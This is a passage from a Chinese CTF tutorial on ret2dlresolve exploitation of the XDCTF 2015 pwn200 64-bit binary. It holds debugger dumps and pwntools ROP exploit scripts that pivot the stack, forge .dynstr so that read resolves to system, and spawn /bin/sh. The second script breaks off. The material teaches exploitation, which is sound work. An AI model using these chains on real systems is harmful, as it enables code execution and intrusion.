 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R13  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R14  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R15  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RBP  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 &lt;_dl_fixup+18&gt;    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 &lt;_dl_fixup+22&gt;    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d &lt;_dl_fixup+29&gt;    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 &lt;_dl_fixup+33&gt;    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 &lt;_dl_fixup+37&gt;    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 &lt;_dl_fixup+41&gt;    mov    rcx, qword ptr [r8 + 8] &lt;0x7f2512ac3191&gt;
</code></pre></div> <p>经过逐步调试发现，在 <code>_dl_runtime_resolve</code> 会在栈中保存大量的数据</p> <div class=highlight><pre><span></span><code>.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
</code></pre></div> <p>其中 qword_227808 处的值为0x0000000000000380。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg&gt; x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 &lt;_rtld_global_ro+168&gt;:   0x0000000000000380
</code></pre></div> <p>当执行完下面的指令后</p> <div class=highlight><pre><span></span><code> ► 0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;
</code></pre></div> <p>栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。</p> <div class=highlight><pre><span></span><code>   0x7f2512dbb7a0 &lt;_dl_runtime_resolve_xsavec&gt;       push   rbx
   0x7f2512dbb7a1 &lt;_dl_runtime_resolve_xsavec+1&gt;     mov    rbx, rsp
   0x7f2512dbb7a4 &lt;_dl_runtime_resolve_xsavec+4&gt;     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;
 ► 0x7f2512dbb7af &lt;_dl_runtime_resolve_xsavec+15&gt;    mov    qword ptr [rsp], rax &lt;0x600a00&gt;
   0x7f2512dbb7b3 &lt;_dl_runtime_resolve_xsavec+19&gt;    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 &lt;_dl_runtime_resolve_xsavec+24&gt;    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd &lt;_dl_runtime_resolve_xsavec+29&gt;    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 &lt;_dl_runtime_resolve_xsavec+34&gt;    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 &lt;_dl_runtime_resolve_xsavec+39&gt;    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* &#39;`&#39; */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* &#39;\t&#39; */
</code></pre></div> <p>或许我们可以考虑把栈再迁移的高一些，但是，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时</p> <ul> <li>bss 段的起始地址为 0x600B30</li> <li>伪造的栈的数据一共有 392 （0x188）</li> </ul> <p>所以直接栈迁移到 bss节很容易出现问题。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
</code></pre></div> <p>但经过精细的调节，我们还是避免破坏 .dynamic 节的内容</p> <ul> <li>修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30</li> <li>修改迁移后的栈的大小为 0x188</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x188</span> <span class=c1># new stack size is 0x188</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x200</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>此时，我们发现程序又崩了，通过 coredump</p> <div class=highlight><pre><span></span><code>❯ gdb -c core
</code></pre></div> <p>我们发现，在处理 xmm 相关的指令时崩了</p> <div class=highlight><pre><span></span><code> ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 &lt;0x7fa8677931f0&gt;

   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* &#39;-c&#39; */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0
</code></pre></div> <p>由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x1a0</span> <span class=c1># new stack size is 0x1a0</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x200</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
